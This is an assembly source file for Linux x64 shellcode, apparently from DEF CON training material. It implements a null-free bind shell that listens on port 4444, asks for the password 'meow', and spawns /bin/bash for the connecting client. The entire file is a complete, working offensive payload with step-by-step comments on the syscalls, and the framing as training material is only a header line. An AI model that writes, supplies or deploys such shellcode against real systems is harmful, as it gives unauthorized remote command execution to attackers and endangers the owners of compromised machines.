; linux/x64 null-free bindshell 
; with password "meow"
; exits on wrong password
; author: @cocomelonc for DEF CON training

section .text
    global _start              ; make _start label visible for the linker, entry point for the program

_start:
    ; create socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    xor     rsi, rsi           ; clear rsi register, used for protocol (IPPROTO_IP = 0)
    mul     rsi                ; multiply rsi by rsi, setting rdx and rax to 0 (clearing them)
    add     al, 0x29           ; set al to 0x29, the syscall number for socket() (in linux)
    inc     rsi                ; set rsi = 0x1 (SOCK_STREAM)
    push    rsi                ; push rsi onto the stack, which is the second argument (SOCK_STREAM)
    pop     rdi                ; pop it into rdi, which is the first argument (address family: AF_INET)
    inc     rdi                ; set rdi = 0x2 (AF_INET), the address family
    syscall                    ; make the syscall (socket()) to create a socket

    ; bind the socket to port 4444
    xchg    rdi, rax           ; exchange rdi (sockfd) with rax (socket file descriptor) from the previous syscall
    xor     rax, rax           ; clear rax register (preparing for the bind syscall)
    add     al, 0x31           ; set al to 0x31, the syscall number for bind()
    push    rdx                ; push 0x0 (padding for sockaddr_in structure)
    push    dx                 ; push another 0x0 (padding for sockaddr_in structure)
    push    dx                 ; push 0x0 for the ip address (INADDR_ANY)
    push    word 0x5c11        ; push the port 4444 (0x5c11) in big-endian format
    inc     rdx                ; increment rdx
    inc     rdx                ; increment rdx
    push    dx                 ; push the address family (AF_INET = 2)
    add     dl, 0x0e           ; set dl to 0x0e (size of sockaddr_in structure)
    mov     rsi, rsp           ; move rsp (pointer to sockaddr_in structure) to rsi
    syscall                    ; make the syscall (bind()) to bind the socket to port 4444

    ; listen for incoming connections
    xor     rax, rax           ; clear rax
    add     al, 0x32           ; set al to 0x32, the syscall number for listen()
    xor     rsi, rsi           ; clear rsi (backlog = 0)
    syscall                    ; make the syscall (listen()) to start listening for connections

    ; accept incoming connections
    xor     rax, rax           ; clear rax
    push    rax                ; push 0 onto the stack for padding
    push    rax                ; push another 0 for padding
    pop     rdx                ; pop the first 0 (client fd) into rdx
    pop     rsi                ; pop the second 0 (client fd) into rsi
    add     al, 0x2b           ; set al to 0x2b, syscall number for accept()
    syscall                    ; make the syscall (accept()) to accept an incoming client connection

    ; duplicate file descriptors (stdin, stdout, stderr) to client socket
    xchg    rdi, rax           ; swap rdi (client socket fd) with rax (fd from accept)
    xor     rsi, rsi           ; clear rsi
    add     dl, 0x03           ; set dl to 3 (for stdin, stdout, stderr)
.dup_loop:
    xor     rax, rax           ; clear rax
    add     al, 0x21           ; set al to 0x21 (syscall number for dup2())
    syscall                    ; make the syscall (dup2()) to redirect stdin
    inc     rsi                ; increment rsi (move to the next file descriptor)
    cmp     rsi, rdx           ; if rsi == rdx (all 3 descriptors done), exit loop
    jne     .dup_loop          ; otherwise, repeat for the next file descriptor

.prompt:
    ; print "password?\n"
    xor     rdi, rdi           ; clear rdi
    mul     rdi                ; multiply (does nothing, just clears rdx)
    push    rdi                ; push 0 onto the stack
    pop     rsi                ; pop the pointer to the "password?" string into rsi

    mov     rsi, 0x0000000000000a3f    ; "\n?" (question mark and newline)
    push    rsi                ; push the first part of the string (newline + question mark)
    mov     rsi, 0x64726f7773736170    ; "password" in little-endian
    push    rsi                ; push the second part of the string ("password")
    mov     rsi, rsp           ; set rsi to point to the string (password?\n)
    inc     rax                ; increment rax (syscall number for write)
    mov     rdi, rax           ; move rax to rdi (file descriptor: stdout)
    mov     dl, 10             ; set dl to 10 (string length)
    syscall                    ; make the syscall (write) to send the string to stdout

    ; read the 4-byte password input
    xor     rdi, rdi           ; clear rdi (file descriptor = 0 for stdin)
    push    rdi                ; push 0 onto the stack
    mul     rdi                ; multiply (does nothing here, just clears rdx)
    mov     rsi, rsp           ; rsi points to the buffer for the password
    add     rdx, 0x04          ; set rdx to 4 (password length)
    syscall                    ; make the syscall (read) to get user input

    ; compare input to "meow"
    mov     rdi, rsp           ; rdi points to the user input
    mov     rsi, 0x776f656d     ; "meow" in little-endian
    push    rsi                ; push "meow" onto the stack
    mov     rsi, rsp           ; rsi points to the stored "meow" string
    xor     rcx, rcx           ; clear rcx (length counter)
    mov     cl, 0x04           ; set cl to 4 (password length)
    repe cmpsb                 ; compare the input with "meow"
    jz      .welcome           ; if they match, jump to welcome message

    ; exit if password incorrect
    mov     al, 0x3c           ; set al to 60, the syscall number for exit()
    xor     rdi, rdi           ; clear rdi
    inc     rdi                ; set rdi to 1 (error code)
    syscall                    ; make the syscall (exit)

.welcome:
    ; print "welcome\n" to the client
    xor     rdi, rdi           ; clear rdi
    mul     rdi                ; multiply (clears rdx)
    push    rdi                ; push 0 onto the stack
    pop     rsi                ; rsi points to the "welcome" string
    mov     rsi, 0x0a656d6f636c6577 ; "welcome\n" in little-endian
    push    rsi                ; push "welcome\n" onto the stack
    mov     rsi, rsp           ; rsi points to the "welcome\n" string
    inc     rax                ; increment rax for syscall number (1 for write)
    mov     rdi, rax           ; move rax to rdi (file descriptor: stdout)
    mov     dl, 8              ; set dl to 8 (length of "welcome\n")
    syscall                    ; make the syscall (write) to send the message to the client

    ; execve("/bin/bash", NULL, NULL) - spawn the shell
    xor     rsi, rsi           ; clear rsi (null for argv[])
    mul     rsi                ; multiply (clears rdx)
    xor     rdi, rdi           ; clear rdi (null for envp[])
    push    rdi                ; push 0 onto the stack
    mov     dl, 0x68           ; 'h' character in little-endian
    push    rdx                ; push the 'h' character onto the stack
    mov     rdx, 0x7361622f6e69622f ; "/bin/bash" in little-endian
    push    rdx                ; push "/bin/bash" onto the stack
    xor     rdx, rdx           ; clear rdx (null for execve arguments)
    mov     rdi, rsp           ; rdi points to the "/bin/bash" string
    mov     al, 0x3b           ; set al to 0x3b, syscall number for execve
    syscall                    ; make the syscall (execve) to start the shell
